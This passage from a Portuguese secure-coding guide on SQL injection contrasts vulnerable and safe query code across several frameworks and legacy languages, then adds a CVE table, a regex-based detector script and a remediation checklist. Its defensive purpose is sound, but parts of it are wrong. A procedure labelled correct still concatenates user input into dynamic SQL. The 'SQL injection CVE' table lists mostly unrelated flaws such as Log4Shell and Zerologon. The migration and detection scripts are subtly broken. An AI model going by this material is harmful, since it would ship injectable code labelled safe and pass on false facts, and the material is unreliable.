CREATE PROCEDURE GetUser(@username NVARCHAR(50))
AS
BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END

-- CORRETO
CREATE PROCEDURE GetUserSafe(@username NVARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @username
END

-- CORRETO para queries dinamicas (quando necessario)
CREATE PROCEDURE DynamicSearch(@tableName NVARCHAR(50), @search NVARCHAR(100))
AS
BEGIN
    -- Whitelist de tabelas
    IF @tableName NOT IN ('users', 'products', 'orders')
    BEGIN
        RAISERROR('Invalid table name', 16, 1)
        RETURN
    END
    
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM ' + QUOTENAME(@tableName) + ' WHERE name LIKE ''%' + @search + '%'''
    EXEC(@sql)
END
```

---

## 5.15 SQL Injection em Frameworks Modernos

### Laravel (PHP)

```php
// Laravel: Eloquent e seguro por padrao
$users = User::where('name', $name)->get();

// Laravel: query builder e seguro por padrao
$users = DB::table('users')->where('name', $name)->get();

// Laravel: raw query VULNERAVEL
$users = DB::select("SELECT * FROM users WHERE name = '$name'");

// Laravel: raw query SEGURO
$users = DB::select("SELECT * FROM users WHERE name = ?", [$name]);

// Laravel: whereRaw VULNERAVEL
$users = User::whereRaw("name = '$name'")->get();

// Laravel: whereRaw SEGURO
$users = User::whereRaw("name = ?", [$name])->get();

// Laravel: orderByRaw VULNERAVEL
$users = User::orderByRaw($sortColumn)->get();

// Laravel: orderByRaw SEGURO (whitelist)
$allowed = ['name', 'email', 'created_at'];
$sort = in_array($sortColumn, $allowed) ? $sortColumn : 'name';
$users = User::orderBy($sort)->get();
```

### Django (Python)

```python
# Django ORM: seguro por padrao
User.objects.filter(username=username)

# Django: raw query VULNERAVEL
User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")

# Django: raw query SEGURO
User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [username])

# Django: extra() VULNERAVEL
User.objects.extra(where=[f"username = '{username}'"])

# Django: extra() SEGURO
User.objects.extra(where=["username = %s"], params=[username])

# Django: cursor VULNERAVEL
cursor.execute(f"SELECT * FROM auth_user WHERE username = '{username}'")

# Django: cursor SEGURO
cursor.execute("SELECT * FROM auth_user WHERE username = %s", [username])
```

### Ruby on Rails

```ruby
# ActiveRecord: seguro por padrao
User.where(name: name)

# ActiveRecord: find_by_sql VULNERAVEL
User.find_by_sql("SELECT * FROM users WHERE name = '#{name}'")

# ActiveRecord: find_by_sql SEGURO
User.find_by_sql(["SELECT * FROM users WHERE name = ?", name])

# ActiveRecord: order VULNERAVEL
User.order("#{params[:sort]}")

# ActiveRecord: order SEGURO (whitelist)
allowed = ['name', 'email', 'created_at']
sort = allowed.include?(params[:sort]) ? params[:sort] : 'name'
User.order(sort)
```

### Spring Boot (Java)

```java
// JPA Repository: seguro por padrao
userRepository.findByName(name);

// JPA: @Query com SpEL VULNERAVEL
@Query("SELECT u FROM User u WHERE u.name = '#{name}")
List<User> findByNameVulnerable(String name);

// JPA: @Query SEGURO
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByNameSafe(@Param("name") String name);

// JDBC Template VULNERAVEL
jdbcTemplate.query("SELECT * FROM users WHERE name = '" + name + "'");

// JDBC Template SEGURO
jdbcTemplate.query("SELECT * FROM users WHERE name = ?", new Object[]{name});
```

---

## 5.16 SQLi em Ambientes de Microservicos

### Riscos em Microservicos

```python
# Microservico de pedidos que consulta servico de usuarios
class OrderService:
    def create_order(self, user_id, product_id):
        # Chamar servico de usuarios via HTTP
        user_response = requests.get(f"http://user-service/api/users/{user_id}")
        user = user_response.json()
        
        # VULNERAVEL: usar dados do servico externo em query
        conn = get_db()
        conn.execute(
            f"INSERT INTO orders (user_id, user_name, product_id) VALUES ({user_id}, '{user['name']}', {product_id})"
        )
        conn.commit()

# Microservico de busca que combina dados de multiplas fontes
class SearchService:
    def search(self, query):
        # Buscar em multiplos servicos
        products = requests.get(f"http://product-service/api/search?q={query}")
        users = requests.get(f"http://user-service/api/search?q={query}")
        
        # VULNERAVEL: usar resultados em query consolidada
        conn = get_db()
        results = conn.execute(
            f"SELECT * FROM search_index WHERE term = '{query}'"
        ).fetchall()
        return results
```

### Prevencao em Microservicos

```python
# Servico de usuarios com API segura
class UserService:
    def get_user(self, user_id):
        # Validar user_id
        if not isinstance(user_id, int) or user_id < 1:
            raise ValueError("Invalid user ID")
        
        # Parameterized query
        conn = get_db()
        user = conn.execute(
            "SELECT id, name, email FROM users WHERE id = ?",
            (user_id,)
        ).fetchone()
        return user

# Servico de pedidos que usa dados validados
class OrderService:
    def create_order(self, user_id, product_id):
        # Chamar servico de usuarios
        user_response = requests.get(f"http://user-service/api/users/{user_id}")
        
        if user_response.status_code != 200:
            raise ValueError("Invalid user")
        
        user = user_response.json()
        
        # Validar dados recebidos
        user_name = user.get('name', '')
        if not re.match(r'^[a-zA-Z\s]{1,100}$', user_name):
            raise ValueError("Invalid user name format")
        
        # Parameterized query
        conn = get_db()
        conn.execute(
            "INSERT INTO orders (user_id, user_name, product_id) VALUES (?, ?, ?)",
            (user_id, user_name, product_id)
        )
        conn.commit()
```

---

## 5.17 SQLi em Aplicacoes Legacy

### Sistemas Legados e SQLi

Aplicacoes legadas frequentemente contem padroes de codigo que tornam SQLi inevitavel:

```cobol
# COBOL: SQL injection em sistemas mainframe
EXEC SQL
    SELECT * INTO :ws-name
    FROM users
    WHERE username = :ws-username
END-EXEC

# Se ws-username contem input nao sanitizado, pode ser vulneravel
```

```vb
' Visual Basic 6: SQL injection classica
Dim conn As New ADODB.Connection
Dim rs As New ADODB.Recordset
Dim sql As String

sql = "SELECT * FROM users WHERE username = '" & txtUsername.Text & "'"
rs.Open sql, conn, adOpenStatic
```

```asp
# Classic ASP: SQL injection
Dim conn, rs, sql
Set conn = Server.CreateObject("ADODB.Connection")
sql = "SELECT * FROM users WHERE username = '" & Request("username") & "'"
Set rs = conn.Execute(sql)
```

### Migracao e Remediacao

```python
# Script de migracao para parameterized queries
import re
import os

def refactor_sql_injection(file_path):
    """Refactor SQL injection vulnerabilities in legacy code."""
    
    with open(file_path, 'r') as f:
        content = f.read()
    
    # Padrões perigosos
    patterns = [
        (r'execute\("(.+?)"\s*%\s*(.+?)\)', 'execute("\\1", \\2)'),
        (r'execute\("(.+?)"\.format\((.+?)\)', 'execute("\\1", (\\2,))'),
        (r'execute\("(.+?)"\s*\+\s*(.+?)\s*\+', 'execute("\\1" + "?" + ..., (\\2, ...))'),
    ]
    
    for pattern, replacement in patterns:
        content = re.sub(pattern, replacement, content)
    
    with open(file_path, 'w') as f:
        f.write(content)
    
    return content
```

---

## 5.18 Resumo de CVEs de SQL Injection

| CVE | Aplicacao | Tipo | Ano | CVSS |
|-----|-----------|------|-----|------|
| CVE-2017-5638 | Apache Struts 2 | RCE via OGNL | 2017 | 10.0 |
| CVE-2019-11510 | Pulse Secure VPN | Auth Bypass | 2019 | 10.0 |
| CVE-2021-44228 | Log4Shell (indireto) | RCE via JNDI | 2021 | 10.0 |
| CVE-2018-7600 | Drupal | RCE via Form API | 2018 | 9.8 |
| CVE-2015-1635 | IIS HTTP.sys | RCE via Range | 2015 | 10.0 |
| CVE-2019-0192 | Apache Solr | RCE via deserialization | 2019 | 9.8 |
| CVE-2020-1472 | Zerologon | Privilege Escalation | 2020 | 10.0 |
| CVE-2017-12617 | Apache Tomcat | RCE via PUT | 2017 | 8.1 |
| CVE-2018-11776 | Apache Struts 2 | RCE via namespace | 2018 | 9.8 |
| CVE-2019-0193 | Apache Solr | RCE via data import | 2019 | 8.6 |
| CVE-2020-17530 | Apache OFBiz | RCE via deserialization | 2020 | 9.8 |
| CVE-2021-21972 | VMware vCenter | RCE via vROPS plugin | 2021 | 9.8 |
| CVE-2022-22963 | Spring Cloud Function | RCE via SpEL | 2022 | 9.8 |
| CVE-2022-22965 | Spring4Shell | RCE via data binding | 2022 | 9.8 |
| CVE-2023-22515 | Atlassian Confluence | Privilege Escalation | 2023 | 10.0 |

### Tendencias e Evolucao

A evolucao de SQL injection continua em 2024 e alem:

**Novos vetores:** APIs GraphQL, WebSocket, gRPC apresentam superficies de ataque emergentes.

**AI-assisted attacks:** Ferramentas de IA podem gerar payloads de SQLi personalizados, tornando ataques mais sophisticated.

**Cloud-native risks:** SQLi em bancos de dados gerenciados (RDS, Cloud SQL) pode ter impacto diferente devido a modelagem de permissoes.

**Zero-day discovery:** Embora a maioria dos pads de SQLi sejam conhecidos, combinacoes unicas em aplicacoes especificas continuam a produzir vulnerabilidades novas.

A defesa continua sendo a mesma: parameterized queries, validacao de entrada, monitoramento, e defesa em profundidade.

### Script de Detecao de SQLi em Codigo Legado

```python
import ast
import re
import os

class SQLiDetector(ast.NodeVisitor):
    """Detecta padroes de SQL injection em codigo Python."""
    
    DANGEROUS_PATTERNS = [
        r'execute\s*\(\s*f["\']',
        r'execute\s*\(\s*["\'].*%\s',
        r'execute\s*\(\s*["\'].*\.format\(',
        r'execute\s*\(\s*["\'].*\+\s*\w',
        r'cursor\.execute\s*\(\s*f["\']',
        r'raw\s*\(\s*f["\']',
    ]
    
    def __init__(self):
        self.vulnerabilities = []
    
    def visit_Call(self, node):
        # Verificar chamadas de execute()
        if hasattr(node.func, 'attr') and node.func.attr == 'execute':
            # Verificar se o primeiro argumento e string formatada
            if node.args:
                arg = ast.dump(node.args[0])
                for pattern in self.DANGEROUS_PATTERNS:
                    if re.search(pattern, arg):
                        self.vulnerabilities.append({
                            'line': node.lineno,
                            'pattern': pattern,
                            'code': ast.dump(node)
                        })
        self.generic_visit(node)

def scan_file(file_path):
    """Escaneia um arquivo Python em busca de SQLi."""
    with open(file_path, 'r') as f:
        content = f.read()
    
    tree = ast.parse(content)
    detector = SQLiDetector()
    detector.visit(tree)
    
    return detector.vulnerabilities

def scan_directory(dir_path):
    """Escaneia um diretorio em busca de SQLi."""
    results = {}
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if file.endswith('.py'):
                file_path = os.path.join(root, file)
                vulns = scan_file(file_path)
                if vulns:
                    results[file_path] = vulns
    return results

# Uso
if __name__ == "__main__":
    results = scan_directory("/path/to/legacy/code")
    for file, vulns in results.items():
        print(f"\n[VULNERABLE] {file}")
        for v in vulns:
            print(f"  Line {v['line']}: {v['pattern']}")
```

### Checklist de Remediacao para Sistemas Legados

```
Fase 1: Descoberta
[ ] Mapear todas as queries SQL no codigo-fonte
[ ] Identificar todas as entradas do usuario
[ ] Catalogar pontos de injecao potenciais
[ ] Priorizar por criticidade e exposicao

Fase 2: Remediacao
[ ] Substituir concatenacao por parameterized queries
[ ] Implementar validacao de entrada em todos os endpoints
[ ] Configurar ORM corretamente (se aplicavel)
[ ] Adicionar middleware de deteccao de SQLi

Fase 3: Validacao
[ ] Testar todas as remediacoes com payloads conhecidos
[ ] Executar scan automatizado de seguranca
[ ] Realizar code review das alteracoes
[ ] Testar em ambiente de staging antes de producao

Fase 4: Monitoramento
[ ] Configurar alertas para queries suspeitas
[ ] Implementar logging de queries
[ ] Monitorar performance (parameterized queries podem ter impacto)
[ ] Estabelecer processo de revisao continua

### Metricas de Sucesso

Apos a remediacao de SQL injection em sistemas legados, as seguintes metricas devem ser monitoradas:

- **Tempo medio de remediacao**: Tempo gasto por vulnerabilidade corrigida
- **Taxa de falsos positivos**: Quantidade de alertas incorretos gerados
- **Cobertura de testes**: Percentual de endpoints testados contra SQLi
- **Tempo de deteccao**: Tempo medio para identificar tentativas de injecao
- **Incidentes de seguranca**: Numero de tentativas de SQLi bem-sucedidas

Essas metricas ajudam a avaliar a eficacia do programa de remediacao e a identificar areas que precisam de atencao adicional.

### Conclusao

SQL injection continua sendo uma das vulnerabilidades mais perigosas e persistentes em aplicações web. A evolucao de tecnicas de ataque, desde o union-based classico ate metodos avancados como second-order e out-of-band injection, demonstra a necessidade de defesas em múltiplas camadas.

Os desenvolvedores devem priorizar parameterized queries como defesa primaria, complementadas por validacao de entrada, WAF, e monitoramento continuo. Ferramentas como SQLMap e Havij facilitam a deteccao e exploracao, mas tambem podem ser usadas para testes de seguranca autorizados.

A chave para a prevencao e a conscientizacao: entender como SQLi funciona, reconhecer os padroes de codigo vulneraveis, e implementar as practices corretas desde o inicio do ciclo de desenvolvimento.
```
